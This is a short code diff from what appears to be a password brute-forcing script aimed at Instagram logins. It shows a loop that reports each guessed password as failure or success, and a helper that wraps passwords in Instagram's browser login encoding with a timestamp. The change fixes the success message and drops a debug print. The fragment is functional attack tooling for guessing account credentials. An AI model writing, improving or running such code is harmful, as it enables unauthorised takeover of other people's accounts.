@@ -97,7 +97,7 @@ def craft_response(username, password, csrf_token):
         print ("Trying: " + "\"" + password + "\"" +"| FAILURE")
 
       else:
-        print ("Success! Password is: " + word)
+        print ("Success! Password is: " + password)
         exit()
 
     except Exception as err:
@@ -106,8 +106,6 @@ def craft_response(username, password, csrf_token):
 def encode_password(password):
 
   formatted_time = str(int(time.time()))
-
-  print (formatted_time) 
 
   enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password
 
